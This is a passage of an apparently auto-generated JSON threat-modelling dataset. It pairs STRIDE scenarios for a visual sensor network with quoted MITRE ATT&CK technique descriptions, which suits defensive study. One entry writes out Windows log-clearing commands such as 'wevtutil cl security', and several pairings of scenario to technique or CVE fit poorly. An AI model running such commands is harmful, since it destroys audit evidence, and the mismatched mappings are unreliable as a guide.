                "description": "Adversaries may establish persistence through executing malicious commands triggered by a user\u2019s shell. User shells execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command line interface or remotely logs in (such as SSH) a login shell is initiated. The login shell executes scripts from the system (/etc) and the user\u2019s home directory (~/) to configure the environment. All login shells on a system use <code>/etc/profile</code> when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user\u2019s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately. \n\nAdversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells. Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the <code>/etc/profile</code> and <code>/etc/profile.d</code> files (Citation: intezer-kaiji-malware). These files require root permissions and are executed each time any shell on a system launches. For user level permissions, adversaries can insert malicious commands into <code>~/.bash_profile</code>, <code>~/.bash_login</code>, or <code>~/.profile</code> (Rocke) which are sourced when a user opens a command line interface or connects remotely. Adversaries often use ~/.bash_profile since the system only executes the first file that exists in the listed order. Adversaries have also leveraged the <code>~/.bashrc</code> file (Tsunami, Rocke, Linux Rabbit, Magento) which is additionally executed if the connection is established remotely or an additional interactive shell is opened, such as a new tab in the command line interface. Some malware targets the termination of a program to trigger execution (Cannon), adversaries can use the <code>~/.bash_logout</code> file to execute malicious commands at the end of a session(Pearl_shellbot). \n\nFor macOS, the functionality of this technique is similar but leverages zsh, the default shell for macOS 10.15+. When the Terminal.app is opened, the application launches a zsh login shell and a zsh interactive shell. The login shell configures the system environment using <code>/etc/profile</code>, <code>/etc/zshenv</code>, <code>/etc/zprofile</code>, and <code>/etc/zlogin</code>. The login shell then configures the user environment with <code>~/.zprofile</code> and <code>~/.zlogin</code>. The interactive shell uses the <code>~/.zshrc<code> to configure the user environment. Upon exiting, <code>/etc/zlogout</code> and <code>~/.zlogout</code> are executed. For legacy programs, macOS executes <code>/etc/bashrc</code> on startup.",
                "id": "attack-pattern--01df3350-ce05-4bdf-bdf8-0a919a66d4a8",
                "technique_id": "T1156"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user could deny having made certain changes or transactions on the IoT application due to insufficient logging and auditing capabilities.",
            "Assumptions": [
                {
                    "Assumption": "The system lacks effective logging mechanisms.",
                    "Role": "System Architect",
                    "Condition": "Ineffective or inadequate logging mechanisms."
                },
                {
                    "Assumption": "Security events are not monitored or correlated effectively.",
                    "Role": "Security Analyst",
                    "Condition": "Lack of effective monitoring and correlation."
                },
                {
                    "Assumption": "The logs are not tamper-proof.",
                    "Role": "System Administrator",
                    "Condition": "Vulnerability to log tampering."
                }
            ],
            "Potential Impact": "This could lead to significant issues in auditing and forensics, potentially compromising accountability and non-repudiation.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "audit",
                "non-repudiation"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "If logs can be altered unauthorized, malicious insiders could erase their activities from audit trails.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient permissions management on log files.",
                    "Role": "System Administrator",
                    "Condition": "Weak permissions management."
                },
                {
                    "Assumption": "Lack of regular review or backup of log files.",
                    "Role": "Security Team",
                    "Condition": "Absence of log review and backup procedures."
                },
                {
                    "Assumption": "The attacker has insider access.",
                    "Role": "Insider Attacker",
                    "Condition": "Insider access to crucial systems."
                }
            ],
            "Potential Impact": "This could eliminate crucial forensic evidence, affecting data integrity and accountability.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "tampering",
                "audit trail"
            ],
            "mitre_technique": {
                "name": "Clear Windows Event Logs",
                "description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\n\nWith administrator privileges, the event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)\n\nAdversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.",
                "id": "attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2",
                "technique_id": "T1070.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Misconfigured time settings on devices could allow denial of performing certain actions, as actions won't properly correlate with incidents.",
            "Assumptions": [
                {
                    "Assumption": "The devices are not synchronized to a reliable time server.",
                    "Role": "System Manager",
                    "Condition": "Lack of time synchronization."
                },
                {
                    "Assumption": "System logs do not capture time-stamped events accurately.",
                    "Role": "System Process",
                    "Condition": "Incorrect or missing time-stamps in logs."
                },
                {
                    "Assumption": "There are vulnerabilities that allow unauthorized exclusion or alteration of time sync settings.",
                    "Role": "System Vulnerability",
                    "Condition": "Security flaws impacting time settings."
                }
            ],
            "Potential Impact": "This could hinder incident response and investigations, affecting data integrity and reliability.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "time manipulation",
                "logging",
                "correlation"
            ],
            "mitre_technique": {
                "name": "Runtime Data Manipulation",
                "description": "Adversaries may modify systems in order to manipulate the data as it is accessed and displayed to an end user, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating runtime data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nAdversaries may alter application binaries used to display data in order to cause runtime manipulations. Adversaries may also conduct [Change Default File Association](https://attack.mitre.org/techniques/T1546/001) and [Masquerading](https://attack.mitre.org/techniques/T1036) to cause a similar effect. The type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--32ad5c86-2bcf-47d8-8fdc-d7f3d79a7490",
                "technique_id": "T1565.003"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker could exploit an Information Disclosure vulnerability (like CVE-2022-2021) mentioned in the NVD data to gain access to sensitive visual data.",
            "Assumptions": [
                {
                    "Assumption": "The vulnerable software version is in use.",
                    "Role": "System Administrator",
                    "Condition": "Deployment of vulnerable software."
                },
                {
                    "Assumption": "Proper security patches are not applied.",
                    "Role": "System Manager",
                    "Condition": "Delay or omission in patching."
                },
                {
                    "Assumption": "The attacker's ability to exploit the vulnerability to access data.",
                    "Role": "Attacker",
                    "Condition": "Ability to reach and exploit the vulnerability."
                }
            ],
            "Potential Impact": "This could lead to unauthorized data access, significantly impacting data confidentiality.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "network",
                "vulnerability",
                "data exfiltration"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker could use a Command and Control domain (e.g., from AlienVault Pulse data) to steal information.",
            "Assumptions": [
                {
                    "Assumption": "The application has internet-facing elements susceptible to malware C2 communication.",
                    "Role": "System Configuration",
                    "Condition": "Internet-facing elements exposure."
                },
                {
                    "Assumption": "No monitoring for malicious outbound communication.",
                    "Role": "Security Team",
                    "Condition": "Lack of monitoring."
                },
                {
                    "Assumption": "The attacker successfully compromises a part of the system to initiate the communication.",
                    "Role": "Attacker",
                    "Condition": "Initial compromise success."
                }
            ],
            "Potential Impact": "This could lead to substantial data compromise, exposing sensitive information to external actors.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "malware",
                "command and control",
                "data exfiltration"
            ],
            "mitre_technique": {
                "name": "Socket Filters",
                "description": "Adversaries may attach filters to a network socket to monitor then activate backdoors used for persistence or command and control. With elevated permissions, adversaries can use features such as the `libpcap` library to open sockets and install filters to allow or disallow certain types of data to come through the socket. The filter may apply to all traffic passing through the specified network interface (or every interface if not specified). When the network interface receives a packet matching the filter criteria, additional actions can be triggered on the host, such as activation of a reverse shell.\n\nTo establish a connection, an adversary sends a crafted packet to the targeted host that matches the installed filter criteria.(Citation: haking9 libpcap network sniffing) Adversaries have used these socket filters to trigger the installation of implants, conduct ping backs, and to invoke command shells. Communication with these socket filters may also be used in conjunction with [Protocol Tunneling](https://attack.mitre.org/techniques/T1572).(Citation: exatrack bpf filters passive backdoors)(Citation: Leonardo Turla Penquin May 2020)\n\nFilters can be installed on any Unix-like platform with `libpcap` installed or on Windows hosts using `Winpcap`.  Adversaries may use either `libpcap` with `pcap_setfilter` or the standard library function `setsockopt` with `SO_ATTACH_FILTER` options. Since the socket connection is not active until the packet is received, this behavior may be difficult to detect due to the lack of activity on a host, low CPU overhead, and limited visibility into raw socket usage.",
                "id": "attack-pattern--005cc321-08ce-4d17-b1ea-cb5275926520",
                "technique_id": "T1205.002"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Data at rest on storage devices is not encrypted, making it accessible through physical access or after a successful breach.",
            "Assumptions": [
                {
                    "Assumption": "Insensitive data storage without encryption.",
                    "Role": "System Design",
                    "Condition": "Lack of encryption for data at rest."
                },
                {
                    "Assumption": "The attacker gains physical or logical access to the storage.",
                    "Role": "Attacker",
                    "Condition": "Access to storage medium."
                },
                {
                    "Assumption": "No secondary access controls (e.g., file permissions) mitigate this flaw.",
                    "Role": "System Configuration",
                    "Condition": "Lack of secondary access controls."
                }
            ],
            "Potential Impact": "This will compromise data confidentiality, exposing sensitive data to unauthorized entities.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "data at rest",
                "access",
                "encryption"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Multiple vulnerabilities (like CVE-2022-20767) involving out-of-bounds write or deserialization could be exploited to disrupt the system's operations.",
            "Assumptions": [
                {
                    "Assumption": "The system uses vulnerable versions of software.",
                    "Role": "System Administrator",
                    "Condition": "Deployment of susceptible versions."
                },
                {
                    "Assumption": "The vulnerabilities are not patched timely.",
                    "Role": "Patch Management",
                    "Condition": "Delayed or missing patch implementation."
                },
                {
                    "Assumption": "The attacker possesses the means to exploit the vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Ability to exploit."
                }
            ],
            "Potential Impact": "This could disrupt system availability, preventing the Visual Sensor Network from functioning properly.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "network",
                "vulnerability exploitation",
                "system disruption"
            ],
            "mitre_technique": {
                "name": "Disk Structure Wipe",
                "description": "Adversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources. \n\nAdversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) may be performed in isolation, or along with [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) if all sectors of a disk are wiped.\n\nOn a network devices, adversaries may reformat the file system using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `format`.(Citation: format_cmd_cisco)\n\nTo maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)",
                "id": "attack-pattern--0af0ca99-357d-4ba1-805f-674fdfb7bef9",
                "technique_id": "T1561.002"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker could launch a Distributed Denial of Service (DDoS) attack on the network, overwhelming it with traffic.",
            "Assumptions": [
                {
                    "Assumption": "The system has insufficient DDoS protection mechanisms.",
                    "Role": "Network Engineer",
                    "Condition": "Lack of DDoS protective measures."
                },
                {
                    "Assumption": "The attacker can coordinate and execute large-scale traffic flooding.",
                    "Role": "Attacker",
                    "Condition": "Capability for large-scale traffic generation."
                },
                {
                    "Assumption": "The network infrastructure can't handle unexpected high traffic loads.",
                    "Role": "System Architect",
                    "Condition": "Inadequate network traffic management."
                }
            ],
            "Potential Impact": "This would significantly impact system availability, potentially causing complete system downtime.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "network",
                "traffic flooding",
                "system disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An insider could maliciously turn off critical network components or disturb their configurations.",
            "Assumptions": [
                {
                    "Assumption": "There are no effective internal audits or monitoring.",
                    "Role": "Security Team",
                    "Condition": "Lack of internal audit and monitoring."
                },
                {
                    "Assumption": "Key network components are not redundantly configured.",
                    "Role": "Network Engineer",
                    "Condition": "Lack of redundancy for critical components."
                },
                {
                    "Assumption": "Access control to critical infrastructure is weak.",
                    "Role": "System Administrator",
                    "Condition": "Poor access control mechanisms."
                }
            ],
            "Potential Impact": "This could lead to a severe disruption of the Visual Sensor Network, impacting system availability.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "insider threat",
                "configuration disruption",
                "system downtime"
            ],
            "mitre_technique": {
                "name": "Network Denial of Service",
                "description": "Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)\n\nA Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nFor DoS attacks targeting the hosting system directly, see [Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499).",
                "id": "attack-pattern--d74c4a7e-ffbf-432f-9365-7ebf1f787cab",
                "technique_id": "T1498"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploitation of OS vulnerabilities (e.g., CVE-2021-2022 in Linux kernel) to gain root access to networked devices.",
            "Assumptions": [
                {
                    "Assumption": "The system runs vulnerable OS versions.",
                    "Role": "System Administrator",
                    "Condition": "Deployment of vulnerable versions."
                },
                {
                    "Assumption": "No patches or mitigation strategies are applied.",
                    "Role": "Patch Management",
                    "Condition": "Failure to apply patches."
                },
                {
                    "Assumption": "The attacker can gain initial access to leverage the vulnerability.",
                    "Role": "Attacker",
                    "Condition": "Initial access obtained."
                }
            ],
            "Potential Impact": "This could allow the attacker to execute arbitrary code, leading to total system compromise affecting confidentiality, integrity, and availability.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "root access",
                "OS vulnerability",
                "system compromise"
            ],
            "mitre_technique": {
                "name": "Kernel Modules and Extensions",
                "description": "Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\u00a0When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\u00a0Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)\n\nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)",
                "id": "attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5",
                "technique_id": "T1215"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Malware could be used by an insider to escalate privileges using known security flaws (e.g., CVE-2023-20867).",
            "Assumptions": [
                {
                    "Assumption": "The system has exploitable software vulnerabilities.",
                    "Role": "System Administrator",
                    "Condition": "Presence of unfixed software vulnerabilities."
                },
                {
                    "Assumption": "Access control and monitoring are weak internally.",
                    "Role": "Security Team",
                    "Condition": "Ineffective internal access controls."
                },
                {
                    "Assumption": "The insider has technical knowledge about the vulnerabilities.",
                    "Role": "Insider",
                    "Condition": "Knowledge about vulnerabilities."
                }
            ],
            "Potential Impact": "This could allow unauthorized access and control over sensitive system components, impacting data confidentiality, integrity, and availability.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "malware",
                "insider threat",
                "system manipulation"
            ],
            "mitre_technique": {
                "name": "Malicious Shell Modification",
                "description": "Adversaries may establish persistence through executing malicious commands triggered by a user\u2019s shell. User shells execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command line interface or remotely logs in (such as SSH) a login shell is initiated. The login shell executes scripts from the system (/etc) and the user\u2019s home directory (~/) to configure the environment. All login shells on a system use <code>/etc/profile</code> when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user\u2019s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately. \n\nAdversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells. Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the <code>/etc/profile</code> and <code>/etc/profile.d</code> files (Citation: intezer-kaiji-malware). These files require root permissions and are executed each time any shell on a system launches. For user level permissions, adversaries can insert malicious commands into <code>~/.bash_profile</code>, <code>~/.bash_login</code>, or <code>~/.profile</code> (Rocke) which are sourced when a user opens a command line interface or connects remotely. Adversaries often use ~/.bash_profile since the system only executes the first file that exists in the listed order. Adversaries have also leveraged the <code>~/.bashrc</code> file (Tsunami, Rocke, Linux Rabbit, Magento) which is additionally executed if the connection is established remotely or an additional interactive shell is opened, such as a new tab in the command line interface. Some malware targets the termination of a program to trigger execution (Cannon), adversaries can use the <code>~/.bash_logout</code> file to execute malicious commands at the end of a session(Pearl_shellbot). \n\nFor macOS, the functionality of this technique is similar but leverages zsh, the default shell for macOS 10.15+. When the Terminal.app is opened, the application launches a zsh login shell and a zsh interactive shell. The login shell configures the system environment using <code>/etc/profile</code>, <code>/etc/zshenv</code>, <code>/etc/zprofile</code>, and <code>/etc/zlogin</code>. The login shell then configures the user environment with <code>~/.zprofile</code> and <code>~/.zlogin</code>. The interactive shell uses the <code>~/.zshrc<code> to configure the user environment. Upon exiting, <code>/etc/zlogout</code> and <code>~/.zlogout</code> are executed. For legacy programs, macOS executes <code>/etc/bashrc</code> on startup.",
                "id": "attack-pattern--01df3350-ce05-4bdf-bdf8-0a919a66d4a8",
                "technique_id": "T1156"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An exploit against misconfigured services running with elevated privileges (e.g., Tauri framework regression vulnerability).",
            "Assumptions": [
                {
                    "Assumption": "Misconfigured services are running with elevated privileges.",
                    "Role": "System Administrator",
                    "Condition": "Poor service configuration."
                },
                {
                    "Assumption": "The attacker can identify and target these misconfigurations.",
                    "Role": "Attacker",
                    "Condition": "Knowledge and detection capacity."
                },
                {
                    "Assumption": "Protection mechanisms do not detect such exploit attempts.",
                    "Role": "Security Systems",
                    "Condition": "Lack of detection mechanisms."
                }
            ],
            "Potential Impact": "This would allow attackers to gain full system control, affecting data confidentiality, integrity, and availability.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "misconfiguration",
                "service",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        }
    ]
},
{
    "case_number": "2",
    "batch_number": "10",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could spoof a legitimate camera node in the Visual Sensor Network to inject false visual data.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has the network access required to intercept and inject traffic.",
                    "Role": "Attacker",
                    "Condition": "Network is not fully secured."
                },
                {
                    "Assumption": "The attacker has tools to mimic the communication protocols used by legitimate nodes.",
                    "Role": "Attacker",
                    "Condition": "Technical understanding of system protocols."
                },
                {
                    "Assumption": "The system lacks sufficient mechanisms to authenticate devices properly.",
                    "Role": "System Designer",
                    "Condition": "Weak authentication methods implemented."
                }
            ],
            "Potential Impact": "Unauthorized data injection leading to misinformation.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "device",
                "network",
                "false data injection"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could spoof the identity of an admin user and take control of the Visual Sensor Network.",
            "Assumptions": [
                {
